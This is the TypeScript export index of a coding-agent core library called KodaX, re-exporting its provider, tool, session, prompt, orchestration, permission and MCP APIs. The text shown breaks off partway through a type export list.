/**
 * KodaX Core
 *
 * 极致轻量化 Coding Agent Core 层
 * 可作为独立库使用，零 UI 依赖
 *
 * @example
 * ```typescript
 * import { runKodaX } from 'kodax/core';
 *
 * const result = await runKodaX(
 *   {
 *     provider: 'anthropic',
 *     context: {
 *       gitRoot: '/repo',
 *       executionCwd: '/repo/packages/app',
 *     },
 *     events: {},
 *   },
  *   "创建一个 HTTP 服务器"
 * );
 * ```
 */

// ============== Re-export from @kodax-ai/llm ==============
// AI types are re-exported for backward compatibility
// New code should import directly from @kodax-ai/llm

export type {
  KodaXImageBlock,
  KodaXContentBlock,
  KodaXTextBlock,
  KodaXToolUseBlock,
  KodaXToolResultBlock,
  KodaXTaskResultMetadata,
  KodaXTaskResultSource,
  KodaXThinkingBlock,
  KodaXRedactedThinkingBlock,
  KodaXMessage,
  KodaXTokenUsage,
  KodaXStreamResult,
  KodaXToolDefinition,
  KodaXModelDescriptor,
  KodaXProtocolFamily,
  KodaXCustomProviderConfig,
  KodaXProviderConfig,
  KodaXProviderTransport,
  KodaXProviderConversationSemantics,
  KodaXProviderMcpSupport,
  KodaXProviderCapabilityProfile,
  KodaXProviderStreamOptions,
  KodaXReasoningCapability,
  KodaXStableEffortIntent,
  KodaXWireReasoningEffort,
  KodaXReasoningEffortRequest,
  KodaXReasoningEffortPreset,
  KodaXReasoningEffortWireStrategy,
  KodaXThinkingWireStrategy,
  KodaXReasoningProfile,
  KodaXReasoningMode,
  KodaXThinkingDepth,
  KodaXTaskType,
  KodaXExecutionMode,
  KodaXRiskLevel,
  KodaXChildFanoutClass,
  KodaXReviewScale,
  KodaXTaskRoutingDecision,
  KodaXThinkingBudgetMap,
  KodaXTaskBudgetOverrides,
  KodaXReasoningRequest,
  KodaXNormalizedReasoningRequest,
} from '@kodax-ai/llm';

export {
  KodaXError,
  KodaXProviderError,
  KodaXRateLimitError,
} from '@kodax-ai/llm';

export {
  createOutputSegmentProjection,
  effectiveOutputSegmentText,
  reduceOutputSegmentProjection,
  type KodaXOutputSegmentActiveState,
  type KodaXOutputSegmentDelta,
  type KodaXOutputSegmentMode,
  type KodaXOutputSegmentProjection,
  type KodaXOutputSegmentProjectionEvent,
  type KodaXOutputSegmentProjectionResult,
  type KodaXOutputSegmentStarted,
} from './output-segments.js';

export {
  awaitLatestCodingMemoryReviewDrain,
  canonicalMemoryProjectId,
  deriveCodingMemoryIdentity,
  deriveCodingMemoryReviewIdentities,
  drainCodingMemoryReviewInbox,
} from './memory-runtime.js';
export {
  createProductionLearningReviewer,
  installProductionLearningReviewer,
  LEARNING_REVIEW_SYSTEM_PROMPT,
  LEARNING_REVIEW_TOOL,
  LEARNING_REVIEW_PROMPT_SHA256,
  LEARNING_REVIEW_SCHEMA_SHA256,
  type CreateProductionLearningReviewerOptions,
} from './learning-reviewer.js';

// ============== Core Types ==============

export type {
  KodaXJsonValue,
  KodaXExtensionSessionRecord,
  KodaXExtensionSessionState,
  KodaXCompactMemoryProgress,
  KodaXCompactMemorySeed,
  KodaXSessionBranchSummaryEntry,
  KodaXSessionCompactionEntry,
  KodaXSessionData,
  KodaXSessionEntry,
  KodaXSessionEntryBase,
  KodaXSessionArtifactLedgerEntry,
  KodaXSessionLabelEntry,
  KodaXSessionLineage,
  KodaXSessionMessageEntry,
  KodaXSessionNavigationOptions,
  KodaXSessionMeta,
  KodaXSessionScope,
  KodaXSessionRuntimeInfo,
  KodaXSessionUiHistoryItem,
  KodaXSessionUiHistoryItemType,
  KodaXSessionUiTextHistoryItem,
  KodaXSessionUiTextHistoryItemType,
  KodaXSessionUiToolCall,
  KodaXSessionUiToolCallStatus,
  KodaXSessionUiToolGroupHistoryItem,
  KodaXSessionWorkspaceKind,
  KodaXEvents,
  KodaXUserInputPromptContext,
  KodaXPromptCacheDiagnosticEvent,
  KodaXSidecarMessageEvent,
  KodaXWorkflowAgentDigestEvent,
  KodaXContextIdentity,
  KodaXContextCompactionFinishedEvent,
  KodaXCompactionEndResult,
  KodaXCompactionFailureReason,
  KodaXLiveEventMeta,
  KodaXTurnCompletedEvent,
  KodaXTurnDeliveryKind,
  KodaXTurnFailedEvent,
  KodaXTurnStartedEvent,
  // SDK: workflow host contract so an embedder can implement KodaXOptions.workflowHost.
  WorkflowToolHost,
  WorkflowToolHostResult,
  WorkflowToolHostInlineInput,
  WorkflowToolHostStartResult,
  WorkflowEventCorrelation,
  KodaXWorkflowEventMeta,
  KodaXActivityEventMeta,
  KodaXToolEventMeta,
  KodaXToolSandboxObservationUpdate,
  ProviderRecoveryEvent,
  KodaXSessionOptions,
  KodaXContextTokenSnapshot,
  KodaXContextOptions,
  KodaXPreparedShellSandboxInvocation,
  KodaXShellSandboxBackend,
  KodaXShellSandboxObservation,
  KodaXShellExecutionContract,
  KodaXShellKind,
  KodaXShellProfileMode,
  KodaXShellSandbox,
  KodaXShellSandboxPrepareInput,
  KodaXTrustedTextCommitInput,
  KodaXTrustedTextCommitOutcome,
  KodaXTrustedTextFileSnapshot,
  KodaXTrustedTextMutationHost,
  KodaXWorkspaceSandboxRootRegistry,
  KodaXSkillScriptInputFile,
  KodaXSkillScriptOutputFile,
  KodaXSkillScriptRunInput,
  KodaXSkillScriptRunner,
  KodaXMcpTransport,
  KodaXMcpConnectMode,

  KodaXMcpServerConfig,
  KodaXMcpServersConfig,
  KodaXTaskCapabilityHint,
  KodaXTaskVerificationCriterion,
  KodaXRuntimeVerificationContract,
  KodaXSkillInvocationContext,
  KodaXSkillMap,
  KodaXSkillProjectionConfidence,
  KodaXRoleRoundSummary,
  KodaXVerificationScorecard,
  KodaXVerificationScorecardCriterion,
  KodaXBudgetExtensionRequest,
  KodaXManagedBudgetSnapshot,
  KodaXMemoryStrategy,
  KodaXBudgetDisclosureZone,
  KodaXAgentMode,
  KodaXCanonicalAgentMode,
  KodaXAgentProfile,
  KodaXEffectiveTaskConfig,
  KodaXToolVisibilityMeta,
  KodaXToolVisibilityPolicy,
  KodaXManagedTaskStatusEvent,
  KodaXOptions,
  KodaXSandboxOptions,
  KodaXCompactionOverride,
  KodaXSelfManualConfig,
  KodaXSkillDynamicContextPolicy,
  KodaXResult,
  KodaXSessionControl,
  KodaXSessionMutators,
  KodaXTaskSurface,
  KodaXTaskStatus,
  KodaXTaskRole,
  KodaXTaskContract,
  KodaXTaskRoleAssignment,
  KodaXTaskWorkItem,
  KodaXTaskEvidenceArtifact,
  KodaXFileInputArtifact,
  KodaXImageInputArtifact,
  KodaXImageMediaType,
  KodaXInputArtifact,
  KodaXInputArtifactSource,
  KodaXVideoInputArtifact,
  KodaXVideoMediaType,
  KodaXTaskEvidenceEntry,
  KodaXTaskEvidenceBundle,
  KodaXTaskToolPolicy,
  KodaXChildContextBundle,
  KodaXChildAgentResult,
  KodaXParentReductionContract,
  KodaXTaskVerificationContract,
  KodaXOrchestrationVerdict,
  KodaXManagedTask,
  KodaXManagedTaskRuntimeState,
  KodaXSessionStorage,
  KodaXSessionTreeNode,
  KodaXToolExecutionContext,
  AskUserAnswer,
  AskUserCustomInputAnswer,
  AskUserQuestionOptions,
  AskUserQuestionItem,
  AskUserMultiOptions,
  AskUserSelectionAnswer,
  KodaXProviderPolicyHints,
  KodaXRepoIntelligenceCapability,
  KodaXRepoIntelligenceMode,
  KodaXRepoIntelligenceResolvedMode,
  KodaXRepoIntelligenceTraceEvent,
  KodaXRepoIntelligenceTrace,
  TodoStatus,
  TodoItem,
  TodoList,
  SessionErrorMetadata,
} from './types.js';

export {
  assertTrustedTextMutationPolicy,
  KodaXTrustedTextMutationError,
} from './trusted-text-mutation.js';
export type {
  KodaXTrustedTextCommitUncertainReceipt,
  KodaXTrustedTextMutationErrorCode,
} from './trusted-text-mutation.js';

export {
  acquireFileSystemMutationLease,
  acquireExclusiveFileSystemEffectLease,
} from './tools/_internal/file-mutation-queue.js';

export { normalizeKodaXAgentMode } from './types.js';
export {
  parseBareInlineSlashReferences,
  parseInlineSkillReferences,
  uniqueBareInlineSlashNames,
  uniqueInlineSkillNames,
  type InlineSkillReference,
} from './skill-references.js';
export {
  normalizeShellExecutionContract,
  shellExecutionContractFingerprint,
} from './shell-execution/contract.js';
export { clearShellExecutionEnvironmentCache } from './shell-execution/resolver.js';
export { parseSandboxEnvironmentPass } from './shell-execution/environment.js';

// ============== Core Errors ==============

export {
  KodaXToolError,
  KodaXSessionError,
  KodaXTerminalError,
} from './errors.js';

// ============== Media / Input Artifacts ==============

export * from './media/index.js';

// ============== Error Classification ==============

export {
  classifyError,
  ErrorCategory,
} from './error-classification.js';

export type {
  ErrorClassification,
} from './error-classification.js';

// ============== Constants ==============

export {
  KODAX_MAX_TOKENS,
  KODAX_DEFAULT_TIMEOUT,
  KODAX_HARD_TIMEOUT,
  KODAX_MAX_RETRIES,
  KODAX_RETRY_BASE_DELAY,
  KODAX_MAX_INCOMPLETE_RETRIES,
  KODAX_STAGGER_DELAY,
  KODAX_API_MIN_INTERVAL,
  PROMISE_PATTERN,
  CANCELLED_TOOL_RESULT_PREFIX,
  CANCELLED_TOOL_RESULT_MESSAGE,
} from './constants.js';

// ============== Provider (re-export from @kodax-ai/llm) ==============

export {
  KodaXBaseProvider,
  KodaXAnthropicCompatProvider,
  KodaXOpenAICompatProvider,
  KODAX_PROVIDERS,
  KODAX_PROVIDER_SNAPSHOTS,
  KODAX_DEFAULT_PROVIDER,
  getProvider,
  getProviderConfiguredCapabilityProfile,
  getProviderConfiguredReasoningCapability,
  isProviderConfigured,
  getProviderModel,
  getProviderModels,
  getProviderList,
  isProviderName,
  createCustomProvider,
  validateCustomProviderConfig,
  registerCustomProviders,
  getCustomProvider,
  isCustomProviderName,
  getCustomProviderNames,
  getCustomProviderList,
  getCustomProviderModels,
  registerModelProvider,
  getRuntimeModelProvider,
  isRuntimeModelProviderName,
  getRuntimeModelProviderNames,
  clearRuntimeModelProviders,
  resolveProvider,
  isKnownProvider,
  getAvailableProviderNames,
  // v0.7.43 SDK model-capability exposure (no API key required).
  getProviderModelDescriptors,
  getModelCapabilities,
  listBuiltinModelCapabilities,
  getCustomProviderModelDescriptors,
  getCustomModelCapabilities,
  listCustomProviderModelCapabilities,
  resolveProviderModelDescriptors,
  resolveModelCapabilities,
  listAllModelCapabilities,
} from './providers/index.js';
export type { ProviderName, KodaXModelCapabilities } from './providers/index.js';

// ============== Tools ==============

export {
  type ToolHandler,
  type ToolRegistry,
  type ToolSideEffect,
  type LocalToolDefinition,
  type RegisteredToolDefinition,
  type ToolDefinitionSource,
  type ToolRegistrationOptions,
  type RuntimeRemoteToolContract,
  type RuntimeRemoteToolContext,
  type RuntimeRemoteToolDecision,
  type RuntimeRemoteWorkspaceBroker,
  type KodaXRetrievalToolName,
  type KodaXRetrievalScope,
  type KodaXRetrievalTrust,
  type KodaXRetrievalFreshness,
  type KodaXRetrievalArtifact,
  type KodaXRetrievalItem,
  type KodaXRetrievalResult,
  KODAX_TOOLS,
  registerTool,
  getTool,
  getToolDefinition,
  resolveToolBridgeTarget,
  getRegisteredToolDefinition,
  getToolRegistrations,
  getBuiltinToolDefinition,
  getBuiltinRegisteredToolDefinition,
  createBuiltinToolDefinition,
  listBuiltinToolDefinitions,
  getAllRegisteredTools,
  isToolPlanModeAllowed,
  isToolFileMutation,
  isToolNetworkRead,
  isToolMutation,
  getRequiredToolParams,
  listTools,
  listToolDefinitions,
  executeTool,
  toolRead,
  toolWrite,
  toolEdit,
  toolInsertAfterAnchor,
  toolBash,
  toolGlob,
  toolGrep,
  toolUndo,
  toolAskUserQuestion,
  toolRepoOverview,
  toolChangedScope,
  toolChangedDiff,
  toolModuleContext,
  toolSymbolContext,
  toolProcessContext,
  toolImpactEstimate,
  toolWebSearch,
  toolWebFetch,
  toolCodeSearch,
  toolSemanticLookup,
  stripHtmlToText,
  extractHtmlTitle,
  renderRetrievalResult,
  finalizeRetrievalResult,
  convertProviderSearchResults,
  convertCapabilityReadResult,
  DEFAULT_TOOL_OUTPUT_MAX_BYTES,
  DEFAULT_TOOL_OUTPUT_MAX_LINES,
  READ_DEFAULT_LIMIT,
  READ_PREFLIGHT_SIZE_BYTES,
  READ_MAX_LINE_CHARS,
  formatSize,
  truncateHead,
  truncateTail,
  truncateLine,
  persistToolOutput,
  resolveToolOutputDir,
  cleanupExpiredToolOutputs,
  cleanupUnreferencedToolOutputs,
  maybeRunReferenceAwareToolOutputGc,
  maybeRunToolOutputGc,
  applyToolResultGuardrail,
  getToolResultPolicy,
  buildToolResultBudget,
  buildToolResultBudgetFromUsage,
  clampToolResultPolicyToBudget,
  inspectEditFailure,
  parseEditToolError,
} from './tools/index.js';

export type {
  EditRecoveryDiagnostic,
  EditToolErrorCode,
  ToolResultBudget,
  ToolResultBudgetReason,
  ToolResultBudgetUsageInput,
  ToolResultCapacity,
  ToolOutputGcResult,
} from './tools/index.js';

export {
  listRunScopedTools,
  runScopedToolMap,
  lookupRunScopedTool,
  toModelToolDefinition,
  executeRunScopedTool,
} from './agent-runtime/run-scoped-tools.js';
export type { RunScopedToolDefinition } from './extensions/runtime-contract.js';
// ============== Repo Intelligence ==============

export type {
  RepoAreaKind,
  ChangedFileStatus,
  RepoAreaOverview,
  RepoOverview,
  ChangedScopeAreaSummary,
  ChangedFileEntry,
  ChangedScopeReport,
} from './repo-intelligence/index.js';

export {
  buildRepoOverview,
  getRepoOverview,
  buildRepoIntelligenceContext,
  renderRepoOverview,
  analyzeChangedScope,
  classifyFileCategory,
  renderChangedScope,
} from './repo-intelligence/index.js';

export type {
  RepoLanguageId,
  LanguageCapabilityTier,
  RepoLanguageSupport,
  RepoSymbolKind,
  RepoSymbolReference,
  RepoSymbolRecord,
  ModuleCapsule,
  ProcessStep,
  ProcessCapsule,
  RepoIntelligenceIndex,
  ModuleContextResult,
  SymbolContextResult,
  ProcessContextResult,
  ImpactEstimateResult,
} from './repo-intelligence/semantic-types.js';

export type {
  KodaXRepoRoutingSignals,
} from './types.js';

export {
  buildRepoIntelligenceIndex,
  getRepoIntelligenceIndex,
  getRepoRoutingSignals,
  getModuleContext,
  getSymbolContext,
  getProcessContext,
  getImpactEstimate,
  prewarmRepoIntelligenceCaches,
} from './repo-intelligence/runtime.js';

export type {
  RepoIntelligenceRuntimeInspection,
} from './repo-intelligence/runtime.js';

export {
  resolveRepoIntelligenceRuntimeConfig,
  resolveRepoIntelligenceMode,
  inspectRepoIntelligenceRuntime,
} from './repo-intelligence/runtime.js';

export {
  renderModuleContext,
  renderSymbolContext,
  renderProcessContext,
  renderImpactEstimate,
} from './repo-intelligence/semantic-render.js';

// ============== Prompts ==============

export {
  SYSTEM_PROMPT,
  buildSystemPrompt,
  buildSystemPromptSnapshot,
  buildCapabilityContextSections,
  PROMPT_SECTION_REGISTRY,
  buildPromptSnapshot,
  createPromptSection,
  orderPromptSections,
  renderPromptSections,
} from './prompts/index.js';
export type {
  KodaXPromptSectionSlot,
  KodaXPromptSectionStability,
  KodaXPromptSectionDefinition,
  KodaXPromptSection,
  KodaXPromptSnapshotMetadata,
  KodaXPromptSnapshot,
} from './prompts/index.js';

// ============== Session ==============

export {
  generateSessionId,
  extractTitleFromMessages,
  appendSessionLineageLabel,
  applySessionCompaction,
  archiveOldIslands,
  buildSessionTree,
  countActiveLineageMessages,
  createSessionLineage,
  forkSessionLineage,
  getSessionLineagePath,
  getSessionMessagesFromLineage,
  resolveSessionLineageTarget,
  findPreviousUserEntryId,
  rewindSessionLineage,
  setSessionLineageActiveEntry,
} from './session.js';

// ============== Message Processing ==============

export {
  extractArtifactLedger,
  mergeArtifactLedger,
  type CompactionAnchor,
  type CompactionUpdate,
  checkIncompleteToolCalls,
} from './messages.js';

export {
  buildPromptMessageContent,
  extractComparableUserMessageText,
  extractPromptComparableText,
} from './input-artifacts.js';

// ============== Tokenizer ==============

export {
  estimateTokens,
  countTokens,
} from './tokenizer.js';

export {
  createRuntimeContextBudgetSnapshot,
  estimateToolSchemaTokens,
} from './agent-runtime/context-budget.js';
export type {
  RuntimeContextBudgetBreakdown,
  RuntimeContextBudgetRecommendation,
  RuntimeContextBudgetSnapshot,
  RuntimeContextBudgetSnapshotInput,
  RuntimeContextOptimizationProfile,
  RuntimeContextPressure,
} from './agent-runtime/context-budget.js';

export {
  ALWAYS_RESIDENT_TOOL_NAMES,
  planToolExposure,
} from './agent-runtime/tool-exposure-planner.js';
export type {
  RuntimeToolExposureDecision,
  RuntimeToolExposureMode,
  RuntimeToolExposurePlan,
  RuntimeToolExposurePlanInput,
  RuntimeToolExposureReason,
} from './agent-runtime/tool-exposure-planner.js';

export {
  consumeCompactionCooldown,
  createCompactionAntiThrashState,
  recordCompactionSavings,
  shouldSkipLlmCompaction,
} from './agent-runtime/middleware/compaction-pressure.js';
export type {
  CompactionAntiThrashConfig,
  CompactionAntiThrashState,
  CompactionSavingsDecision,
  CompactionSavingsSample,
  CompactionSkipReason,
  RuntimeCompactionSkippedEvent,
} from './agent-runtime/middleware/compaction-pressure.js';

export {
  buildToolSearchIndex,
  parseToolSearchQuery,
  searchToolIndex,
} from './tools/tool-search-index.js';
export type {
  ToolSearchIndex,
  ToolSearchIndexEntry,
  ToolSearchIndexOptions,
  ToolSearchQueryParts,
  ToolSearchResult,
} from './tools/tool-search-index.js';

// ============== Agent ==============

export {
  runKodaX,
  checkPromiseSignal,
} from './agent.js';

// v0.7.42 — non-blocking SDK entry (closes gap 6 reported by KodaX Space).
// `startKodaX` returns a `RunningSession` handle so embedders can flip
// provider/model/reasoning mid-run and abort cooperatively without
// forging an external AbortSignal. See `./running-session.ts`.
export { startKodaX, createSessionControl } from './running-session.js';
export type { RunningSession } from './running-session.js';

// CAP-002: extracted from agent.ts to agent-runtime/ in FEATURE_100 P2.
// v0.7.35.1 FEATURE_142 Batch D: uplifted to @kodax-ai/agent/runtime-middleware/.
// Re-exported here so SDK consumers via `@kodax-ai/coding` see no API break.
export {
  cleanupIncompleteToolCalls,
  validateAndFixToolHistory,
} from '@kodax-ai/agent';

// v0.7.35.1 FEATURE_142 (B-R1): coding-flavored compaction summary
// prompts moved here from @kodax-ai/agent. Coding callers pass
// these explicitly to preserve byte-equivalent v0.7.35 prompt behavior;
// session-lineage now ships a neutral `DEFAULT_SUMMARY_PROMPT` as
// fallback for generic / non-coding consumers.
export {
  CODING_SUMMARY_PROMPT,
  CODING_UPDATE_SUMMARY_PROMPT,
} from './agent-runtime/coding-compaction-prompts.js';

// FEATURE_101 (v0.7.31): admission contract — capability-coupled
// invariants (budgetCeiling / toolPermission / boundedRevise) plus
// the bootstrap that registers the full v1 set.
// (FEATURE_184 Phase C.1: independentReview deleted — superseded by
// Sidecar Verifier.)
export {
  CODING_INVARIANTS,
  boundedRevise,
  budgetCeiling,
  registerCodingInvariants,
  resolveToolCapability,
  toolPermission,
} from './agent-runtime/invariants/index.js';

// FEATURE_093 (v0.7.24): KodaXClient imported directly from client.ts to
// avoid re-creating the agent ↔ client cycle at the barrel.
export { KodaXClient } from './client.js';

export {
  runManagedTask,
} from './task-engine.js';

export type {
  CapabilityKind,
  CapabilityResult,
  CapabilityProvider,
  CapabilitySearchFailure,
  CapabilitySearchFreshness,
  CapabilitySearchOptions,
  CapabilitySearchSnapshot,
  ModelProviderRegistration,
  ExtensionCommandDefinition,
  ExtensionCommandContext,
  ExtensionCommandInvocation,
  ExtensionCommandResult,
  ExtensionContributionSource,
  ExtensionLoadSource,
  ExtensionLogger,
  ExtensionToolBeforeHookContext,
  ExtensionEventMap,
  ExtensionHookMap,
  ExtensionRuntimeController,
  LoadedExtensionDiagnostic,
  RegisteredCapabilityProviderDiagnostic,
  RegisteredCommandDiagnostic,
  RegisteredHookDiagnostic,
  RegisteredToolDiagnostic,
  ExtensionFailureStage,
  ExtensionFailureDiagnostic,
  ExtensionRuntimeDiagnostics,
  KodaXExtensionAPI,
  KodaXExtensionActivationResult,
  KodaXExtensionModule,
  OfficialSandboxMode,
  OfficialSandboxOptions,
  BoundExtensionRuntimeController,
  CapabilityRuntimeContract,
  ExtensionDiscoveryResult,
  ExtensionDiscoverySkipReason,
  ExtensionRuntimeContract,
  RuntimeDefaultsSnapshot,
  SkippedExtensionDiscoveryEntry,
} from './extensions/index.js';

export {
  CombinedExtensionRuntime,
  KodaXExtensionRuntime,
  combineExtensionRuntimes,
  createExtensionRuntime,
  setActiveExtensionRuntime,
  getActiveExtensionRuntime,
  registerConfiguredMcpCapabilityProvider,
  replaceConfiguredMcpCapabilityProvider,
  buildMcpReverseCapabilities,
  mcpRootsFromWorkspace,
  type McpReverseWorkspace,
  registerOfficialSandboxExtension,
  dedupeExtensionPathsByEntrypoint,
  discoverDefaultExtensions,
  discoverExtensionsInDirectory,
  discoverExtensionsInDirectoryDetailed,
  excludeExtensionPathsByEntrypoint,
  getDefaultExtensionDirectory,
  isSupportedExtensionModulePath,
  resolveExtensionEntrypoint,
} from './extensions/index.js';

// ============== Orchestration ==============
export {
  runOrchestration,
  createKodaXTaskRunner,
} from './orchestration.js';

export type {
  OrchestrationTaskExecution,
  OrchestrationTaskStatus,
  OrchestrationTaskBudget,
  OrchestrationArtifact,
  OrchestrationWorkerSpec,
  OrchestrationWorkerResult,
  OrchestrationCompletedTask,
  OrchestrationTaskContext,
  OrchestrationWorkerRunner,
  OrchestrationTraceEvent,
  OrchestrationRunEvents,
  OrchestrationRunOptions,
  OrchestrationRunResult,
  KodaXAgentWorkerSpec,
  CreateKodaXTaskRunnerOptions,
} from './orchestration.js';

// ============== Parallel Dispatch ==============
export {
  isParallelDispatchDirective,
  formatParallelDispatchResult,
  validateSubtaskIndependence,
} from './parallel-dispatch.js';

export type {
  ParallelSubtask,
  ParallelDispatchDirective,
  ParallelDispatchResult,
} from './parallel-dispatch.js';

// ============== Reasoning ==============
export {
  KODAX_STABLE_EFFORT_INTENTS,
  normalizeReasoningEffortValue,
  mapLegacyReasoningModeToEffortIntent,
  effortToLegacyReasoningMode,
  parseReasoningEffortEnv,
  resolveReasoningEffort,
  resolveReasoningEffortForModelSwitch,
  // FEATURE_222 (R6): canonical host-facing wire-effort resolver — re-exported
  // so it reaches the root '@kodax-ai/kodax' barrel (which re-exports coding),
  // not only the '@kodax-ai/kodax/llm' subpath.
  resolveWireEffort,
} from '@kodax-ai/llm';
export type { ResolveWireEffortInput, ResolvedWireEffort } from '@kodax-ai/llm';

// FEATURE_275 (v0.7.77): host-opt-in selector for sparse governed
// memory interventions. The normal coding runtime remains provider-neutral.
export {
  createCodingMemoryInterventionRunner,
  MEMORY_INTERVENTION_SELECTOR_SHA256,
  MEMORY_INTERVENTION_SELECTOR_PROMPT,
} from './memory/intervention-selector.js';
export type {
  CodingMemoryInterventionRunnerOptions,
} from './memory/intervention-selector.js';

export {
  KODAX_REASONING_MODE_SEQUENCE,
  resolveReasoningMode,
  reasoningModeToDepth,
  inferTaskType,
  buildFallbackRoutingDecision,
  buildProviderPolicyHintsForDecision,
  createReasoningPlan,
} from './reasoning.js';

export type {
  KodaXProviderCapabilitySnapshot,
  KodaXProviderPolicyDecision,
  KodaXProviderPolicyIssue,
  KodaXProviderPolicyIssueSeverity,
  KodaXProviderSourceKind,
} from './provider-policy.js';

export {
  buildProviderCapabilitySnapshot,
  buildProviderPolicyPromptNotes,
  evaluateProviderPolicy,
} from './provider-policy.js';

// Client alias
export { KodaXClient as Client } from './client.js';

// ============== Permissions ==============
export {
  classifyBashCommand,
  createBashClassifierConfig,
  DEFAULT_SAFE_PATTERNS,
  DEFAULT_DANGEROUS_PATTERNS,
} from './permissions/bash-classifier.js';
export type {
  BashRiskLevel,
  BashClassificationResult,
  BashClassifierConfig,
} from './permissions/bash-classifier.js';

export {
  createDenialTracker,
  recordDenial,
  isDeniedRecently,
  getDenialContext,
  computeInputSignature,
} from './permissions/denial-tracker.js';
export type { DenialRecord, DenialTracker } from './permissions/denial-tracker.js';

// ============== Context Loaders ==============

export {
  loadAgentsFiles,
  formatAgentsForPrompt,
  getKodaxGlobalDir,
} from './context/agents-loader.js';

export type {
  AgentsFile,
  LoadAgentsOptions,
} from './context/agents-loader.js';


// ============== Resilience (Feature 045) ==============
export type {
  ResilienceErrorClass,
  FailureStage,
  RecoveryAction,
  RecoveryLadderStep,
  ResilienceClassification,
  ProviderExecutionState,
  RecoveryDecision,
  RecoveryResult,
  ProviderResilienceConfig,
  ProviderResiliencePolicy,
} from './resilience/types.js';

export type {
  KodaXLlmTimeoutConfig,
  KodaXWorkflowTimeoutConfig,
  KodaXTimeoutConfig,
} from './timeouts.js';

export {
  timeoutSecToMs,
  parseTimeoutSecEnvMs,
  providerResilienceConfigFromTimeouts,
} from './timeouts.js';

export {
  DEFAULT_RESILIENCE_CONFIG,
  resolveResilienceConfig,
} from './resilience/config.js';

export {
  classifyResilienceError,
  isSessionRecoveryCandidateError,
} from './resilience/classifier.js';

export {
  StableBoundaryTracker,
} from './resilience/stable-boundary.js';

export {
  ProviderRecoveryCoordinator,
} from './resilience/recovery-coordinator.js';

export {
  reconstructMessagesWithToolGuard,
} from './resilience/tool-guard.js';

// ============== Extension Helpers ==============
export { exec, webhook } from './extensions/helpers.js';

// ============== Layer A Primitives (FEATURE_080 + FEATURE_081, v0.7.23, @experimental) ==============
// History: extracted to @kodax-ai/core in FEATURE_082 (v0.7.24); merged back
// into @kodax-ai/agent in v0.7.35.1 FEATURE_142 (single-consumer rule). These
// barrel re-exports preserve the batteries-included shape of @kodax-ai/coding
// — not a deprecation shim, they stay permanently.
//
// The Option-Y dog-food registers the default coding dispatcher as a side
// effect of importing `./coding-preset.js`.

export type { Agent, AgentMessage, AgentReasoningProfile, AgentTool, Guardrail, Handoff, ReasoningDepth, InMemorySessionOptions, MessageEntry, Session, SessionEntry, SessionExtension, SessionForkOptions, CompactionContext, CompactionEntry, CompactionEntryPayload, CompactionPolicy, DefaultSummaryCompactionOptions, PresetDispatcher, RunEvent, RunOptions, RunResult } from '@kodax-ai/agent';

export type { CompactionResult } from '@kodax-ai/agent';
export {
  createAgent,
  createHandoff,
  createInMemorySession,
  DefaultSummaryCompaction,
  Runner,
  registerPresetDispatcher,
} from '@kodax-ai/agent';

// v0.7.42 — agent config home + third-party app namespace helper.
// Re-exported from `@kodax-ai/coding` so SDK consumers reach them via the
// root SDK or `/coding` subpath without depending on `@kodax-ai/agent`
// directly. `getAppDataDir` is the entrypoint downstream SDK embedders
// (KodaX Space, IDE extensions) should use for `~/.kodax/apps/<appId>/`.
export {
  getAgentConfigHome,
  getAgentConfigPath,
  setAgentConfigHome,
  getAppDataDir,
} from '@kodax-ai/agent';

// v0.7.35.1 FEATURE_142 (A-R1): coding-AMA H2 role declarations are
// coding-side now (`@kodax-ai/coding/src/agents/task-engine-agents.ts`),
// re-exported through coding's `agents/` barrel. See ADR-021.
// FEATURE_193 v0.7.43: V1 chain (Scout/Planner/Generator) Agent declarations
// retired. Name constants survive for verdict-recorder routing + historical
// session id compat.
export {
  SCOUT_AGENT_NAME,
  PLANNER_AGENT_NAME,
  GENERATOR_AGENT_NAME,
  WORKER_AGENT_NAME,
  TASK_ENGINE_ROLE_AGENTS,
  workerAgent,
} from './agents/task-engine-agents.js';

export {
  DEFAULT_CODING_AGENT_NAME,
  createDefaultCodingAgent,
} from './coding-preset.js';

// FEATURE_193 v0.7.43: V1 chain Coding Agent instances + V1 emit tools
// (scoutCodingAgent / plannerCodingAgent / generatorCodingAgent /
// CODING_AGENTS / EMIT_SCOUT_VERDICT_TOOL_NAME / EMIT_CONTRACT_TOOL_NAME /
// emitScoutVerdict / emitContract) all retired. EMIT_VERDICT_TOOL_NAME +
// emitVerdict survive for the Sidecar Verifier (FEATURE_184).
export {
  CODING_AGENT_MARKER,
  EMIT_VERDICT_TOOL_NAME,
  PROTOCOL_EMITTER_TOOLS,
  emitVerdict,
} from './agents/index.js';
export type { ProtocolEmitterMetadata } from './agents/index.js';

// FEATURE_085 (v0.7.26): adapter wrapping the legacy per-tool truncation
// policy as a Layer A ToolGuardrail.afterTool. Opt-in — the SA preset path
// continues to call applyToolResultGuardrail directly.
export {
  TOOL_RESULT_TRUNCATION_GUARDRAIL_NAME,
  createToolResultTruncationGuardrail,
} from './tools/tool-result-truncation-guardrail.js';

// FEATURE_082 (v0.7.24): LineageExtension and LineageCompaction moved to
// `@kodax-ai/agent`. Barrel re-export kept for
// batteries-included consumers; not a deprecation shim.
export type {
  LineageArtifactLedgerPayload,
  LineageEntryType,
  LineageLabelPayload,
  LineageTreeNode,
  LineageCompactionDelegates,
} from '@kodax-ai/agent';

export { LINEAGE_ENTRY_TYPES, LineageExtension, LineageCompaction } from '@kodax-ai/agent';

// NOTE: `KodaXSessionLineage` is exported above (line ~90) alongside the
// legacy session types. As of FEATURE_081 (v0.7.23) it is superseded by
// `Session` + `LineageExtension`; scheduled for removal in FEATURE_086
// (v0.7.27) alongside the `KodaX*` prefix cleanup.
export type { ExecOptions, ExecResult, WebhookOptions, WebhookResult } from './extensions/helpers.js';

// FEATURE_082 (v0.7.24): MCP provider moved to `@kodax-ai/agent`. Barrel
// re-export kept for batteries-included consumers; not a deprecation shim.
export type {
  McpServerConfig,
  McpServersConfig,
  McpTransportKind,
  McpConnectMode,
  McpCapabilityKind,
  McpCapabilityRisk,
  McpIcon,
  McpToolTaskSupport,
  McpCatalogItem,
  McpCapabilityDescriptor,
  McpServerCatalogSnapshot,
  McpServerRuntimeDiagnostics,
  McpProviderOptions,
  McpReverseCapabilities,
  McpRoot,
  McpElicitRequest,
  McpElicitResult,
  McpSamplingRequest,
  McpSamplingResult,
  McpTransport,
  McpTransportEvents,
  ProtectedResourceMetadata,
  AuthorizationServerMetadata,
  DiscoveredOAuthEndpoints,
  WwwAuthenticateChallenge,
  OAuthLoginConsent,
  PerformOAuthLoginOptions,
  OAuthClientInfo,
